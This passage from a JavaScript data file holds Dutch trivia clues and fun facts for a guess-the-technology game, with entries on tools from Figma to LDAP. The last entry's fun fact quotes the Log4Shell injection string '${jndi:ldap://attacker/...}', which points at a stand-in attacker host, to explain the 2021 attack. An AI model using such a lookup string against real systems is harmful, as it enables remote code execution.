      'Het draait in de browser en tekent het canvas met WebGL en C++ dat naar WebAssembly is gecompileerd.',
      'Meerdere mensen kunnen tegelijk hetzelfde bestand bewerken.',
      'Adobe wilde het in 2022 kopen voor 20 miljard dollar, maar de deal ging niet door.',
      'Ontwerpers dragen werk over aan ontwikkelaars met Dev Mode.',
      'De samenwerkende ontwerptool voor interfaces die voor veel teams Sketch verving.'
    ],
    funFact: 'Toen de deal met Adobe in 2023 sneuvelde door bezwaren van toezichthouders, betaalde Adobe een afkoopsom van 1 miljard dollar.'
  },
  343: {
    clues: [
      'Larry Ellison, Bob Miner en Ed Oates begonnen het bedrijf erachter in 1977.',
      'De naam kwam van een CIA-project waaraan ze hadden gewerkt.',
      'De eerste release heette versie 2; een versie 1 heeft nooit bestaan.',
      'De procedurele taal is PL/SQL.',
      'Grote bedrijven draaien het, en de licenties zijn berucht duur.',
      'De belangrijkste relationele database van Larry Ellison, genoemd naar een voorspeller van de goden.'
    ],
    funFact: 'Versie 1 werd overgeslagen, omdat de oprichters dachten dat klanten een eerste versie niet zouden vertrouwen.'
  },
  344: {
    clues: [
      'Tony Tam begon eraan in 2011 bij een bedrijf dat Wordnik heette.',
      'In 2015 werd het geschonken aan een initiatief van de Linux Foundation en hernoemd.',
      'Het beschrijft elk pad, elke parameter en elk antwoord van een HTTP-API in YAML of JSON.',
      'Tools genereren er interactieve documentatie, clients en servers uit.',
      'Het is nog steeds bekend onder de oude naam, Swagger.',
      "De standaard om REST-API's te beschrijven, met een naam die met 'Open' begint."
    ],
    funFact: 'De naam Swagger leeft voort als merk voor tools van SmartBear, terwijl de specificatie zelf een nieuwe naam kreeg.'
  },
  345: {
    clues: [
      'Max Lynch, Ben Sperry en Adam Bradley brachten het in 2013 uit.',
      'Het combineerde eerst AngularJS met Apache Cordova.',
      'Het team bouwde de compiler Stencil om de componenten framework-onafhankelijk te maken.',
      'De native runtime Capacitor verving Cordova.',
      'Het bouwt mobiele apps met webtechniek.',
      'Het hybride appframework met een naam die klinkt als een soort chemische binding.'
    ],
    funFact: 'De componenten zijn standaard webcomponents, dus ze werken met Angular, React, Vue of helemaal geen framework.'
  },
  346: {
    clues: [
      'Brian Mann begon er in 2014 aan te bouwen, en rond 2017 werd het openbaar.',
      'Anders dan oudere tools draait het in dezelfde browserloop als je app.',
      "Met de runner kun je 'tijdreizen' door DOM-snapshots van elke stap.",
      "Tests ketenen commando's zoals cy.get('button').click().",
      'Jarenlang was het de populairste end-to-endtesttool voor frontendontwikkelaars.',
      'De testtool met de Engelse naam van een altijd groene boom, de cipres.'
    ],
    funFact: 'De eerste versies ondersteunden alleen browsers op basis van Chrome; Firefox kwam in 2020.'
  },
  347: {
    clues: [
      'Taylor Otwell bracht het in 2011 uit.',
      'De naam werd losjes geïnspireerd door een kasteel uit de boeken van Narnia.',
      'De ORM heet Eloquent en de templates Blade.',
      'De commandlinetool heet Artisan.',
      'Het is het populairste PHP-framework.',
      'Het PHP-framework van Taylor Otwell, bekend om zijn elegante syntax.'
    ],
    funFact: 'Otwell heeft gezegd dat de naam doet denken aan Cair Paravel, het kasteel van de koningen en koninginnen van Narnia.'
  },
  348: {
    clues: [
      'Yehuda Katz en Carl Lerche schreven de eerste versie in 2014.',
      'Het downloadt dependencies van crates.io.',
      'Het manifest noemt dependencies onder een tabel [dependencies].',
      "Commando's als build, run, test en clippy lopen er allemaal via.",
      'Het is de pakketbeheerder en buildtool van Rust.',
      'De pakketbeheerder van Rust, met de Engelse naam voor vracht op een schip.'
    ],
    funFact: 'Yehuda Katz had eerder Bundler voor Ruby helpen maken, en dat zie je terug in het ontwerp.'
  },
  349: {
    clues: [
      'Mark Otto en Jacob Thornton bouwden het in 2011 bij een sociaal netwerk.',
      'De interne naam was eerst Twitter Blueprint.',
      'Het maakte een grid van 12 kolommen de standaard voor een generatie websites.',
      'Klassen als .btn, .container en .navbar komen ervan.',
      'Talloze sites uit de jaren 2010 delen de herkenbare stijl.',
      'Het CSS-framework met een naam die ook het opstarten van een systeem vanaf nul betekent.'
    ],
    funFact: 'Een tijd lang was het het project met de meeste sterren op GitHub.'
  },
  350: {
    clues: [
      'Het W3C publiceerde het in 1998 als aanbeveling.',
      'Het is een vereenvoudigde subset van SGML.',
      'Elke openingstag moet gesloten worden, en documenten moeten well-formed zijn.',
      "XPath, XSLT en XSD-schema's werken er allemaal mee.",
      'Het is de X in AJAX, en SOAP-berichten worden erin geschreven.',
      'De eXtensible Markup Language.'
    ],
    funFact: 'Word- en Excel-bestanden die op .docx en .xlsx eindigen, zijn zip-archieven vol met deze taal.'
  },
  351: {
    clues: [
      'Ton Roosendaal begon er midden jaren 90 aan in Nederland, als interne tool.',
      'Nadat zijn bedrijf failliet ging, haalde een campagne in 2002 100.000 euro op om de broncode te kopen.',
      'De foundation en de studio zitten in Amsterdam.',
      'Het maakt open films, zoals Big Buck Bunny en Sintel.',
      'Het is een gratis opensourcepakket voor 3D-modelleren, animatie en rendering.',
      'De 3D-software met de Engelse naam van een keukenapparaat.'
    ],
    funFact: "De campagne 'Free Blender' haalde in 2002 in zeven weken 100.000 euro op, en sindsdien is de software open source."
  },
  352: {
    clues: [
      'Jesse James Garrett bedacht de term in een essay in februari 2005.',
      'Het browserobject erachter werd eerst door Microsoft gebouwd voor Outlook op het web.',
      'Gmail en Google Maps lieten de wereld zien wat het kon.',
      'Een pagina kan hiermee op de achtergrond data ophalen zonder volledig te herladen.',
      'De naam staat voor Asynchronous JavaScript and XML.',
      'De webtechniek met dezelfde naam als een Amsterdamse voetbalclub.'
    ],
    funFact: 'XMLHttpRequest, het object in de kern, werd gemaakt door het team van Outlook Web Access en zat in 1999 in Internet Explorer 5.'
  },
  353: {
    clues: [
      'Willy Tarreau begon eraan rond 2000.',
      'Het verdeelt zowel TCP- als HTTP-verkeer.',
      'GitHub, Reddit en Stack Overflow hebben het allemaal voor hun servers gebruikt.',
      'De configuratie heeft frontend- en backend-secties.',
      'Het is beroemd omdat het enorme aantallen verbindingen aankan met weinig CPU.',
      'De High Availability Proxy.'
    ],
    funFact: 'De auteur onderhield jarenlang ook stabiele langetermijnversies van de Linux-kernel.'
  },
  354: {
    clues: [
      'Apple maakte het in 2001 door KHTML van het KDE-project te forken.',
      'Het draaide onder Safari vanaf de eerste release in 2003.',
      'Chrome gebruikte het ook, tot Google het in 2013 afsplitste als Blink.',
      'Jarenlang moest elke browser op de iPhone het gebruiken.',
      'Het is nu de engine achter Safari.',
      'De browser-engine van Apple, met een naam die het web en een gereedschapskist verbindt.'
    ],
    funFact: 'Chrome DevTools groeide uit de Web Inspector ervan, uit de tijd voordat Google de engine afsplitste.'
  },
  355: {
    clues: [
      'Het werd al decennia gebruikt voordat RFC 4180 het in 2005 probeerde te beschrijven.',
      'Een waarde met het scheidingsteken erin moet tussen dubbele aanhalingstekens.',
      "In sommige landen, zoals in de Nederlandse Excel, gebruikt het puntkomma's, wat iedereen in de war brengt.",
      'Spreadsheets maken er bij het openen graag datums van.',
      "Het is de simpelste manier om een tabel tussen programma's te verplaatsen.",
      "Het formaat van door komma's gescheiden waarden."
    ],
    funFact: 'Spreadsheetsoftware maakte van gennamen als SEPT2 en MARCH1 steeds datums, dus in 2020 gaven wetenschappers 27 menselijke genen een nieuwe naam.'
  },
  356: {
    clues: [
      'Gerald Combs begon eraan in 1998.',
      'Het vangt elk pakket op een netwerkinterface op.',
      'Displayfilters zoals tcp.port == 443 beperken wat je ziet.',
      'De dissectors decoderen duizenden protocollen.',
      'In 2006 kreeg het een nieuwe naam, omdat de oorspronkelijke naam, Ethereal, een merk was van een oud-werkgever.',
      'De netwerkprotocolanalyzer genoemd naar een roofdier in zee.'
    ],
    funFact: 'De maker wisselde in 2006 van baan en kon het merk Ethereal niet meenemen, dus kreeg het project een nieuwe naam.'
  },
  357: {
    clues: [
      'John Ousterhout maakte het in 1988 aan Berkeley.',
      'Alles is er een string, zelfs code.',
      'Het was bedoeld om als commandotaal in andere tools ingebouwd te worden.',
      'De GUI-toolkit Tk is wat tkinter van Python omhult.',
      'Tools voor chipontwerp en de automatiseringstool Expect gebruiken het nog.',
      "De Tool Command Language, uitgesproken als 'tickle'."
    ],
    funFact: 'De standaard GUI-library van Python, tkinter, draait achter de schermen letterlijk een interpreter voor deze taal.'
  },
  358: {
    clues: [
      'Het werd in augustus 2006 als bèta gelanceerd.',
      'Een groot deel werd eerst gebouwd door een klein team in Kaapstad, Zuid-Afrika.',
      "Je start machines vanuit images die AMI's heten.",
      'Instancetypes hebben namen als t3.micro en m5.large, en spot instances worden goedkoop verkocht.',
      'Het maakte het normaal om een server per uur te huren.',
      'De Elastic Compute Cloud van Amazon.'
    ],
    funFact: 'De eerste versie werd in Kaapstad ontwikkeld door een team onder leiding van Chris Pinkham.'
  },
  359: {
    clues: [
      'Het werd gangbaar via e-mailstandaarden voor bijlagen.',
      'Het maakt van elke drie bytes vier leesbare tekens.',
      'Het alfabet is A tot Z, a tot z, 0 tot 9, plus twee symbolen.',
      'Eén of twee isgelijktekens aan het eind zijn opvulling.',
      "Data-URI's en JWT's gebruiken het, of een URL-veilige variant.",
      'De codering van binair naar tekst, genoemd naar het aantal tekens dat het gebruikt.'
    ],
    funFact: 'Omdat vier tekens drie bytes dragen, wordt iets dat je ermee codeert ongeveer een derde groter.'
  },
  360: {
    clues: [
      'De Khronos Group bracht het uit in 2016.',
      'Het groeide uit Mantle, een graphics-API die AMD doneerde.',
      'Het geeft ontwikkelaars expliciete, low-level controle over de GPU.',
      'De shaders worden gecompileerd naar een tussenformaat dat SPIR-V heet.',
      'Het wordt gezien als de opvolger van OpenGL.',
      'De cross-platform graphics-API met een naam die Duits is voor vulkaan.'
    ],
    funFact: 'Op Apple-apparaten, die het niet zelf ondersteunen, draait een vertaallaag die MoltenVK heet het bovenop Metal.'
  },
  361: {
    clues: [
      'Het begon als wiskundige notatie in een boek van Kenneth Iverson uit 1962.',
      'Het heeft speciale symbolen nodig zoals ⍴ en ⍳, en vroeger zelfs een speciaal toetsenbord.',
      'Het werkt op hele arrays tegelijk, zonder expliciete lussen.',
      "Conway's Game of Life past in één beroemde regel van deze taal.",
      'Het inspireerde arraytalen zoals J, K en Q.',
      'Een taal van drie letters, genoemd naar de titel van het boek waarin hij werd geïntroduceerd.'
    ],
    funFact: 'Kenneth Iverson kreeg in 1979 de Turing Award, grotendeels voor deze notatie.'
  },
  362: {
    clues: [
      'Eric Schoffstall maakte het in 2013.',
      'Het verkoos code boven configuratie, anders dan concurrent Grunt.',
      'Taken sturen bestanden als stroom door plug-ins met .pipe().',
      'De taken staan in een JavaScript-bestand dat naar de tool zelf is genoemd.',
      'Het was dé frontend-taskrunner voordat bundlers het overnamen.',
      'De JavaScript-taskrunner met een Engelse naam die snel doorslikken betekent.'
    ],
    funFact: 'Het logo is een rode frisdrankbeker met een rietje, passend bij het idee van iets in één keer opdrinken.'
  },
  363: {
    clues: [
      'Het werd gelanceerd op 14 maart 2006, Pi-dag.',
      'Bestanden worden als objecten opgeslagen in buckets.',
      'Het is ontworpen voor elf negens duurzaamheid.',
      'In 2017 legde een typefout in één commando een deel ervan plat, en daarmee een groot deel van het web.',
      'Veel andere diensten bieden nu een API die ermee compatibel is.',
      'De Simple Storage Service van Amazon.'
    ],
    funFact: 'De storing in 2017 begon toen een engineer een commando verkeerd intypte dat maar een paar servers had moeten verwijderen.'
  },
  364: {
    clues: [
      'Jean-loup Gailly en Mark Adler schreven het in 1992 voor het GNU-project.',
      'Het moest compress vervangen, waarvan het algoritme gepatenteerd was.',
      'Het gebruikt het algoritme DEFLATE.',
      'De bestanden eindigen op .gz, vaak na .tar.',
      "Webservers sturen het mee met een Content-Encoding-header om pagina's kleiner te maken.",
      'De compressietool van GNU, met een naam van vier kleine letters.'
    ],
    funFact: 'Mark Adler, een van de auteurs, werkte ook aan de Marsrovers bij het Jet Propulsion Laboratory van NASA.'
  },
  365: {
    clues: [
      'Tim Howes en anderen aan de University of Michigan maakten het in 1993.',
      "Het is een afgeslankte manier om met X.500-directory's te praten.",
      'Items hebben distinguished names zoals cn=Ada,dc=example,dc=com.',
      'In 2021 misbruikte de Log4Shell-aanval lookups die ernaar wezen.',
      'Active Directory spreekt het, en bedrijven bewaren er gebruikers en groepen in.',
      'Het Lightweight Directory Access Protocol.'
    ],
    funFact:
      'De Log4Shell-aanval werkte door een server een string als ${jndi:ldap://attacker/...} te laten loggen, waardoor Java code van buitenaf ophaalde en uitvoerde.'
  }
};
